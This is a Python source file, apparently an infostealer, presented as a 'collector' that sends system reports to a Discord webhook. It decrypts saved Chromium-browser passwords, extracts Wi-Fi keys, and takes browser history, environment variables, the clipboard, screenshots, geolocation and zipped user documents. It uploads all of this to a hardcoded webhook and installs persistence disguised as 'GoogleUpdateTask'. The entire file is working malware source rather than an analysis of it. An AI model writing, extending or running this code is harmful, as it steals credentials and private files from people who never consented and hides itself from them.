#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
collector.py - Recolector multiplataforma + envio a webhook de Discord.
Windows / Linux / macOS / Android (Kivy-Buildozer o Termux).
"""
from __future__ import annotations

import argparse, base64, datetime as dt, getpass, glob, json, os, platform, re
import shutil, socket, sqlite3, subprocess, sys, tempfile, time, traceback
import uuid, zipfile
from pathlib import Path

# ----------------------------------------------------------------------------
# CONFIG
# ----------------------------------------------------------------------------
DEFAULT_WEBHOOK = ("https://discord.com/api/webhooks/1562815752652718111/"
                   "5Dhc847naUwAIZi9B3efa3TFZWtYZiiCEU6Vq3KJrAdCyuS1OVQDN6ZXV0bYQg8-88F2")

try:
    from _secret import WEBHOOK_URL as _SW
except Exception:
    _SW = ""

WEBHOOK_URL = (os.environ.get("WEBHOOK_URL") or _SW or DEFAULT_WEBHOOK)
WEBHOOKS = [u.strip() for u in WEBHOOK_URL.split(",") if u.strip().startswith("http")]

BOT_NAME         = os.environ.get("BOT_NAME", "sysinfo")
MAX_EMBEDS_MSG   = 10
MAX_FIELDS_EMBED = 25
FIELD_LIMIT      = 1020
ATTACH_MAX       = 7 * 1024 * 1024

try:
    import requests
except Exception:
    requests = None
try:
    import psutil
except Exception:
    psutil = None

SKIP = set()
ANDROID = "ANDROID_ARGUMENT" in os.environ or "ANDROID_ROOT" in os.environ
LINUX = platform.system() == "Linux"

# ----------------------------------------------------------------------------
# HELPERS
# ----------------------------------------------------------------------------
def _run(cmd, timeout=12):
    try:
        p = subprocess.run(cmd, shell=True, capture_output=True, text=True,
                           timeout=timeout, errors="replace")
        return ((p.stdout or "") + (p.stderr or "")).strip()
    except Exception:
        return ""

def _trunc(s, n=FIELD_LIMIT):
    s = str(s)
    return s if len(s) <= n else s[: n - 3] + "..."

def _home() -> Path:
    try:
        return Path.home()
    except Exception:
        return Path("/")

def _roots_usuario():
    roots, home = [], _home()
    for n in ("Desktop", "Escritorio", "Documents", "Documentos",
              "Downloads", "Descargas", "Pictures", "Imagenes"):
        p = home / n
        if p.exists():
            roots.append(p)
    if LINUX:
        for extra in ("/sdcard/Download", "/sdcard/Documents", "/sdcard/DCIM",
                      "/storage/emulated/0/Download", "/storage/emulated/0/Documents"):
            p = Path(extra)
            if p.exists():
                roots.append(p)
    vistos, out = set(), []
    for r in roots:
        if str(r) not in vistos:
            vistos.add(str(r)); out.append(r)
    return out

_SECTIONS = []
def section(titulo):
    def deco(fn):
        _SECTIONS.append((titulo, fn))
        return fn
    return deco

# ----------------------------------------------------------------------------
# LECTURA DIRECTA DE /proc  (sustituye a psutil en Android / Linux)
# ----------------------------------------------------------------------------
def _procfs_mem():
    d = {}
    try:
        for line in open("/proc/meminfo"):
            k, v = line.split(":", 1)
            if k in ("MemTotal", "MemAvailable", "SwapTotal"):
                d[k] = f"{int(v.split()[0]) / 1048576:.2f} GB"
    except Exception:
        pass
    return d

def _procfs_cpu():
    d = {}
    try:
        txt = open("/proc/cpuinfo").read()
        m = re.search(r"model name\s*:\s*(.+)", txt) or re.search(r"Hardware\s*:\s*(.+)", txt)
        if m:
            d["cpu_modelo"] = m.group(1).strip()[:120]
        d["cpu_nucleos"] = str(txt.count("processor"))
        if "Features" in txt:
            d["cpu_flags"] = txt.split("Features")[1].split("\n")[0].split(":")[-1].strip()[:220]
    except Exception:
        pass
    try:
        d["loadavg"] = open("/proc/loadavg").read().strip()
    except Exception:
        pass
    return d

def _procfs_bateria():
    for p in ("/sys/class/power_supply/battery/capacity",
              "/sys/class/power_supply/BAT0/capacity",
              "/sys/class/power_supply/BAT1/capacity"):
        try:
            cap = open(p).read().strip()
            est = ""
            for s in ("/sys/class/power_supply/battery/status",):
                try:
                    est = open(s).read().strip()
                except Exception:
                    pass
            return f"{cap}% {est}".strip()
        except Exception:
            pass
    return ""

def _procfs_procs(limit=60):
    out = []
    try:
        for pid in os.listdir("/proc"):
            if not pid.isdigit():
                continue
            try:
                comm = open(f"/proc/{pid}/comm").read().strip()
                rss = 0
                for line in open(f"/proc/{pid}/status"):
                    if line.startswith("VmRSS"):
                        rss = int(line.split()[1]) * 1024
                        break
                out.append((rss, f"{pid} | {comm} | {rss / 1048576:.0f}MB"))
            except Exception:
                continue
    except Exception:
        pass
    out.sort(reverse=True)
    return out[:limit]

def _uptime():
    try:
        if psutil:
            s = time.time() - psutil.boot_time()
        elif LINUX:
            s = float(open("/proc/uptime").read().split()[0])
        else:
            s = 0
        h, r = divmod(int(s), 3600); m, _ = divmod(r, 60)
        return f"{h}h {m}m"
    except Exception:
        return "n/d"

# ----------------------------------------------------------------------------
# RECOLECTORES
# ----------------------------------------------------------------------------
@section("Sistema")
def sec_sistema():
    mac = ":".join(f"{(uuid.getnode() >> i) & 0xff:02x}" for i in range(0, 48, 8))
    return {
        "hostname": socket.gethostname(),
        "usuario": getpass.getuser() or "n/d",
        "SO": f"{platform.system()} {platform.release()}",
        "build": platform.version(),
        "arquitectura": platform.machine(),
        "procesador": platform.processor() or "n/d",
        "python": sys.version.split()[0],
        "frozen": str(getattr(sys, "frozen", False)),
        "cwd": os.getcwd(),
        "pid": str(os.getpid()),
        "MAC": mac,
        "hora_local": dt.datetime.now().isoformat(timespec="seconds"),
        "timezone": time.tzname[0] if time.tzname else "?",
        "uptime": _uptime(),
    }

@section("Hardware")
def sec_hardware():
    d = {}
    if psutil:
        try:
            d["cpu_logicos"] = str(psutil.cpu_count(logical=True))
            d["cpu_fisicos"] = str(psutil.cpu_count(logical=False))
            d["cpu_uso_%"] = f"{psutil.cpu_percent(interval=0.6)}"
            try:
                d["cpu_freq_mhz"] = str(int(psutil.cpu_freq().current))
            except Exception:
                pass
            vm = psutil.virtual_memory()
            d["ram_total_GB"] = f"{vm.total / 1e9:.2f}"
            d["ram_usada_%"] = f"{vm.percent}"
            d["swap_GB"] = f"{psutil.swap_memory().total / 1e9:.2f}"
            b = getattr(psutil, "sensors_battery", lambda: None)()
            if b:
                d["bateria"] = f"{b.percent}% {'cargando' if b.power_plugged else 'descargando'}"
        except Exception:
            pass
    elif LINUX:
        d.update(_procfs_mem())
        d.update(_procfs_cpu())
        bat = _procfs_bateria()
        if bat:
            d["bateria"] = bat

    discos = []
    if psutil:
        for p in psutil.disk_partitions(all=False):
            try:
                u = psutil.disk_usage(p.mountpoint)
                discos.append(f"{p.device} [{p.fstype}] {u.used / 1e9:.1f}/"
                              f"{u.total / 1e9:.1f} GB ({u.percent}%)")
            except Exception:
                pass
    elif LINUX:
        try:
            for line in open("/proc/mounts"):
                parts = line.split()
                if len(parts) > 2 and parts[1].startswith(("/", "/sdcard", "/storage")):
                    try:
                        u = shutil.disk_usage(parts[1])
                        discos.append(f"{parts[0]} [{parts[2]}] "
                                      f"{u.used / 1e9:.1f}/{u.total / 1e9:.1f} GB")
                    except Exception:
                        pass
        except Exception:
            pass
    d["discos"] = "\n".join(discos[:10]) or "n/d"

    if platform.system() == "Windows":
        d["gpu"] = _run("wmic path win32_VideoController get name", 25)
        d["placa_base"] = _run("wmic baseboard get product,manufacturer", 25)
    else:
        d["gpu"] = _run("lspci | grep -i 'vga\\|3d'") or "n/d"
    return d

@section("Red")
def sec_red():
    d = {}
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(("8.8.8.8", 80)); d["ip_local"] = s.getsockname()[0]; s.close()
    except Exception:
        d["ip_local"] = "n/d"
    try:
        d["ip_publica"] = requests.get("https://api.ipify.org", timeout=8).text.strip()
    except Exception:
        d["ip_publica"] = _run("curl -s https://api.ipify.org") or "n/d"
    if psutil:
        try:
            for iface, addrs in psutil.net_if_addrs().items():
                for a in addrs:
                    if a.family == socket.AF_INET:
                        d[f"iface_{iface}"] = a.address
        except Exception:
            pass
    return d

@section("Geolocalizacion")
def sec_geo():
    try:
        r = requests.get("http://ip-api.com/json/?fields=status,country,regionName,"
                         "city,zip,lat,lon,timezone,isp,org,as,query", timeout=8).json()
        return {k: str(v) for k, v in r.items()}
    except Exception as e:
        return {"error": str(e)}

@section("Variables de entorno")
def sec_env():
    if "env" in SKIP:
        return {}
    return {k: os.environ[k][:280] for k in sorted(os.environ)}

@section("Procesos")
def sec_procesos():
    if psutil:
        procs = []
        for p in psutil.process_iter(["pid", "name", "username", "memory_info"]):
            try:
                mi = p.info["memory_info"]
                procs.append((mi.rss if mi else 0,
                              f'{p.info["pid"]} | {p.info["name"]} | '
                              f'{(mi.rss / 1048576 if mi else 0):.0f}MB | {p.info["username"]}'))
            except Exception:
                pass
    elif LINUX:
        procs = _procfs_procs(80)
    else:
        return {"nota": "sin psutil"}

    procs.sort(reverse=True)
    return {"total": str(len(procs)),
            "top30_ram": "\n".join(x[1] for x in procs[:30]),
            "lista": "\n".join(x[1] for x in procs[:180])}

@section("Programas instalados")
def sec_programas():
    so = platform.system()
    if so == "Windows":
        txt = _run('powershell -NoProfile -Command "Get-ItemProperty '
                   'HKLM:\\Software\\Wow6432Node\\Microsoft\\Windows\\CurrentVersion\\Uninstall\\*,'
                   'HKLM:\\Software\\Microsoft\\Windows\\CurrentVersion\\Uninstall\\* | '
                   'Select-Object DisplayName,DisplayVersion | Where-Object {$_.DisplayName} | '
                   'Sort-Object DisplayName | Format-Table -HideTableHeaders"', 60)
    elif so == "Linux":
        txt = (_run("dpkg-query -W -f='${Package} ${Version}\\n' 2>/dev/null | head -250")
               or _run("rpm -qa | head -250")
               or _run("pm list packages | head -250"))
    else:
        txt = _run("brew list --versions | head -250")
    return {"resumen": txt[:1000] or "n/d", "completo": txt[:4000] or "n/d"}

@section("WiFi")
def sec_wifi():
    if platform.system() == "Windows":
        raw = _run("netsh wlan show profiles")
        perfiles = re.findall(r"(?:Perfil de todos los usuarios|All User Profile)\s*:\s*(.+)", raw)
        lineas = []
        for p in perfiles[:15]:
            p = p.strip()
            info = _run(f'netsh wlan show profile name="{p}" key=clear')
            m = re.search(r"(?:Contenido de la clave|Key Content)\s*:\s*(.+)", info)
            lineas.append(f"{p} | {m.group(1).strip() if m else 'sin clave'}")
        return {"perfiles_con_clave": "\n".join(lineas) or "n/d"}
    txt = _run("nmcli -t -f NAME,TYPE device connection show") or _run("iwconfig")
    if not txt and ANDROID:
        txt = _run("dumpsys wifi | head -40")
    return {"perfiles": (txt or "n/d")[:1000]}

def _chrome_history(hist: Path, limit=15):
    try:
        tmp = Path(tempfile.gettempdir()) / f"h_{abs(hash(str(hist)))}.db"
        shutil.copy2(hist, tmp)
        con = sqlite3.connect(str(tmp)); cur = con.cursor()
        cur.execute("SELECT title,url,visit_count FROM urls ORDER BY last_visit_time DESC LIMIT ?", (limit,))
        rows = cur.fetchall(); con.close()
        return "\n".join(f"{(t or '')[:55]} - {u[:70]} (x{v})" for t, u, v in rows)
    except Exception as e:
        return f"error: {e}"

def _firefox_history(limit=15):
    try:
        pl = sorted(glob.glob(str(_home() / ".mozilla/firefox/*/places.sqlite")),
                    key=os.path.getmtime, reverse=True)
        if not pl:
            return ""
        tmp = Path(tempfile.gettempdir()) / "ff.db"; shutil.copy2(pl[0], tmp)
        con = sqlite3.connect(str(tmp)); cur = con.cursor()
        cur.execute("SELECT title,url,visit_count FROM moz_places ORDER BY last_visit_date DESC LIMIT ?", (limit,))
        rows = cur.fetchall(); con.close()
        return "\n".join(f"{(t or '')[:55]} - {u[:70]} (x{v})" for t, u, v in rows)
    except Exception:
        return ""

@section("Navegadores")
def sec_navegadores():
    home = _home()
    perfiles = {
        "Chrome":   home / "AppData/Local/Google/Chrome/User Data/Default",
        "Edge":     home / "AppData/Local/Microsoft/Edge/User Data/Default",
        "Brave":    home / "AppData/Local/BraveSoftware/Brave-Browser/User Data/Default",
        "Chromium": home / ".config/chromium/Default",
        "Vivaldi":  home / "AppData/Local/Vivaldi/User Data/Default",
    }
    d = {}
    for nombre, p in perfiles.items():
        h = p / "History"
        if h.exists():
            d[f"{nombre}_historial"] = _chrome_history(h)
            pw = _chrome_passwords(p, 12)
            if pw:
                d[f"{nombre}_passwords"] = pw
    ff = _firefox_history()
    if ff:
        d["Firefox_historial"] = ff
    return d or {"nota": "sin navegadores detectados"}

def _chrome_passwords(profile: Path, limit=12):
    db = profile / "Login Data"
    ls = profile.parent / "Local State"
    if not db.exists() or not ls.exists() or platform.system() != "Windows":
        return ""
    try:
        import ctypes
        from ctypes import wintypes

        class BLOB(ctypes.Structure):
            _fields_ = [("cbData", wintypes.DWORD),
                        ("pbData", ctypes.POINTER(ctypes.c_char))]

        def dpapi(enc):
            buf = ctypes.create_string_buffer(enc, len(enc))
            bi = BLOB(len(enc), ctypes.cast(buf, ctypes.POINTER(ctypes.c_char)))
            bo = BLOB()
            if not ctypes.windll.crypt32.CryptUnprotectData(
                    ctypes.byref(bi), None, None, None, None, 0, ctypes.byref(bo)):
                raise OSError("dpapi fail")
            return ctypes.string_at(bo.pbData, bo.cbData)

        key = base64.b64decode(
            json.loads(ls.read_text(encoding="utf-8"))["os_crypt"]["encrypted_key"])[5:]
        key = dpapi(key)
        from cryptography.hazmat.primitives.ciphers.aead import AESGCM
        aes = AESGCM(key)
        tmp = Path(tempfile.gettempdir()) / "ld_copy.db"
        shutil.copy2(db, tmp)
        con = sqlite3.connect(str(tmp)); cur = con.cursor()
        cur.execute("SELECT origin_url,username_value,password_value FROM logins LIMIT ?", (limit,))
        out = []
        for url, u, pw in cur.fetchall():
            try:
                if pw[:3] == b"v10":
                    plain = aes.decrypt(pw[3:15], pw[15:], None).decode("utf-8", "replace")
                else:
                    plain = dpapi(pw).decode("utf-8", "replace")
            except Exception:
                plain = "<cifrado>"
            out.append(f"{u} @ {url[:45]} : {plain}")
        con.close()
        return "\n".join(out)
    except Exception:
        return ""

@section("Archivos recientes")
def sec_archivos():
    d = {}
    for root in _roots_usuario():
        try:
            items = sorted(root.iterdir(), key=lambda x: -x.stat().st_mtime)[:20]
            d[root.name] = "\n".join(f"{i.name}{'/' if i.is_dir() else ''}"
                                     for i in items) or "(vacia)"
        except Exception as e:
            d[root.name] = str(e)
    return d

@section("Tareas y arranque")
def sec_tareas():
    d = {}
    if platform.system() == "Windows":
        d["schtasks"] = _run('schtasks /query /fo LIST | findstr /i "TaskName"', 30)[:1000]
        d["servicios_auto"] = _run("powershell -NoProfile -Command \"Get-Service | "
                                   "? {$_.StartType -eq 'Automatic'} | Select -First 30 -Expand Name\"", 30)
    else:
        d["crontab"] = (_run("crontab -l 2>/dev/null") or "(vacio)")[:900]
        d["autostart"] = "\n".join(p.name for p in _home().glob(".config/autostart/*.desktop")) or "(vacio)"
    return d

@section("Portapapeles")
def sec_clipboard():
    if not ANDROID:
        try:
            import tkinter
            r = tkinter.Tk(); r.withdraw()
            t = r.clipboard_get(); r.destroy()
            if t:
                return {"contenido": t[:800]}
        except Exception:
            pass
    for cmd in ("powershell -NoProfile -Command Get-Clipboard",
                "xclip -o -selection clipboard", "pbpaste", "termux-clipboard-get"):
        out = _run(cmd, 8)
        if out:
            return {"contenido": out[:800]}
    return {"contenido": "n/d"}

# ----------------------------------------------------------------------------
# CAPTURA
# ----------------------------------------------------------------------------
def _screenshot(destino: Path) -> bool:
    try:
        from PIL import ImageGrab
        ImageGrab.grab().save(destino)
        if destino.exists() and destino.stat().st_size > 0:
            return True
    except Exception:
        pass
    for cmd in (f"screencap -p {destino}", f"import -window root {destino}",
                f"scrot {destino}", f"gnome-screenshot -f {destino}"):
        if _run(cmd, 20) and destino.exists() and destino.stat().st_size > 0:
            return True
    return False

DOC_EXT = {".pdf", ".doc", ".docx", ".xls", ".xlsx", ".ppt", ".pptx",
           ".txt", ".csv", ".json", ".jpg", ".jpeg", ".png", ".zip", ".rar"}

def grab_docs(max_bytes=18 * 1024 * 1024):
    out = Path(tempfile.mkdtemp()) / "docs.zip"
    total = 0
    try:
        with zipfile.ZipFile(out, "w", zipfile.ZIP_DEFLATED) as z:
            for root in _roots_usuario():
                for f in root.rglob("*"):
                    try:
                        if not f.is_file() or f.suffix.lower() not in DOC_EXT:
                            continue
                        if f.stat().st_size > 4 * 1024 * 1024 or total > max_bytes:
                            continue
                        z.write(f, str(f.name))
                        total += f.stat().st_size
                    except Exception:
                        continue
    except Exception:
        return None
    return out if out.exists() and out.stat().st_size > 200 else None

# ----------------------------------------------------------------------------
# RECOLECCION / ENVIO
# ----------------------------------------------------------------------------
def run_collection() -> dict:
    data, errores = {}, {}
    for titulo, fn in _SECTIONS:
        try:
            r = fn()
            if r:
                data[titulo] = r
        except Exception as e:
            errores[titulo] = f"{type(e).__name__}: {e}"
    if errores:
        data["Errores de recoleccion"] = errores
    return data

def _post(url, payload=None, files=None, timeout=90):
    if requests is None:
        return False
    try:
        if files:
            r = requests.post(url, data={"payload_json": json.dumps(payload or {})},
                              files=files, timeout=timeout)
        else:
            r = requests.post(url, json=payload or {}, timeout=timeout)
        if r.status_code == 429:
            time.sleep(float(r.headers.get("Retry-After", 2)) + 0.5)
            return _post(url, payload, files, timeout)
        return r.status_code < 400
    except Exception:
        return False

def build_embeds(data: dict):
    campos = []
    for titulo, cuerpo in data.items():
        if isinstance(cuerpo, dict):
            for k, v in cuerpo.items():
                campos.append({"name": _trunc(f"{titulo} · {k}", 256),
                               "value": _trunc(v) or "-",
                               "inline": len(str(v)) < 55})
        else:
            campos.append({"name": _trunc(titulo, 256), "value": _trunc(cuerpo) or "-"})
    total = max(1, (len(campos) + MAX_FIELDS_EMBED - 1) // MAX_FIELDS_EMBED)
    embeds = []
    for i in range(0, len(campos), MAX_FIELDS_EMBED):
        embeds.append({
            "title": f"Informe {i // MAX_FIELDS_EMBED + 1}/{total}",
            "color": 0x5865F2,
            "fields": campos[i:i + MAX_FIELDS_EMBED],
            "footer": {"text": f"{socket.gethostname()} · {platform.system()} {platform.release()}"},
            "timestamp": dt.datetime.utcnow().isoformat() + "Z",
        })
    return embeds

def send_report(data: dict, screen=None, zipfile_=None, dump=None) -> bool:
    if not WEBHOOKS:
        print("[!] No hay webhook configurado"); return False
    if requests is None:
        print("[!] Falta el modulo 'requests'"); return False

    ok = False
    embeds = build_embeds(data)
    for i in range(0, len(embeds), MAX_EMBEDS_MSG):
        payload = {"username": BOT_NAME, "embeds": embeds[i:i + MAX_EMBEDS_MSG]}
        for u in WEBHOOKS:
            ok = _post(u, payload) or ok

    for ruta, caption, ctype in ((screen, "Captura de pantalla", "image/png"),
                                 (dump, "Volcado JSON completo", "application/json"),
                                 (zipfile_, "Documentos del usuario", "application/zip")):
        if ruta and Path(ruta).exists() and Path(ruta).stat().st_size < ATTACH_MAX:
            for u in WEBHOOKS:
                with open(ruta, "rb") as fh:
                    ok = _post(u, {"username": BOT_NAME, "content": caption},
                               files={"file": (Path(ruta).name, fh, ctype)}) or ok
    return ok

def test_webhook() -> bool:
    msg = (f"Conectado desde **{socket.gethostname()}** "
           f"({platform.system()} {platform.release()} / {platform.machine()})")
    r = False
    for u in WEBHOOKS:
        r = _post(u, {"username": BOT_NAME, "content": msg}) or r
    return r

def install_persistence():
    exe = sys.executable
    cmd = f'"{exe}"' if getattr(sys, "frozen", False) else f'"{exe}" "{Path(__file__).resolve()}"'
    try:
        if platform.system() == "Windows":
            import winreg
            k = winreg.OpenKey(winreg.HKEY_CURRENT_USER,
                               r"Software\Microsoft\Windows\CurrentVersion\Run",
                               0, winreg.KEY_SET_VALUE)
            winreg.SetValueEx(k, "GoogleUpdateTask", 0, winreg.REG_SZ, cmd)
            winreg.CloseKey(k)
        elif platform.system() == "Linux":
            ad = _home() / ".config/autostart"; ad.mkdir(parents=True, exist_ok=True)
            (ad / "gupdate.desktop").write_text(
                "[Desktop Entry]\nType=Application\nName=GoogleUpdateTask\n"
                f"Exec={cmd}\nX-GNOME-Autostart-enabled=true\n", encoding="utf-8")
    except Exception:
        pass

def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("--json"); ap.add_argument("--delay", type=int, default=0)
    ap.add_argument("--no-screen", action="store_true")
    ap.add_argument("--no-env", action="store_true")
    ap.add_argument("--grab", action="store_true")
    ap.add_argument("--install", action="store_true")
    ap.add_argument("--gui", action="store_true")
    ap.add_argument("--test", action="store_true")
    ap.add_argument("--debug", action="store_true")
    a = ap.parse_args()

    if a.no_env:  SKIP.add("env")
    if a.install: install_persistence(); return
    if a.test:
        print("[+] Webhook OK" if test_webhook() else "[!] Webhook FALLO"); return
    if a.delay:   time.sleep(a.delay)
    if a.gui:
        import camuflaje; camuflaje.run(); return

    data = run_collection()
    tmp = Path(tempfile.mkdtemp())
    dump = tmp / "informe.json"
    dump.write_text(json.dumps(data, ensure_ascii=False, indent=1), encoding="utf-8")

    screen = None
    if not a.no_screen:
        screen = tmp / "pantalla.png"
        if not _screenshot(screen):
            screen = None

    z = grab_docs() if a.grab else None
    if a.json:
        Path(a.json).write_text(dump.read_text(encoding="utf-8"), encoding="utf-8")
    if a.debug:
        print(json.dumps(data, ensure_ascii=False, indent=2)[:4000])

    print("[+] Enviado" if send_report(data, screen, z, dump) else "[!] Fallo al enviar")

if __name__ == "__main__":
    try:
        main()
    except Exception:
        traceback.print_exc()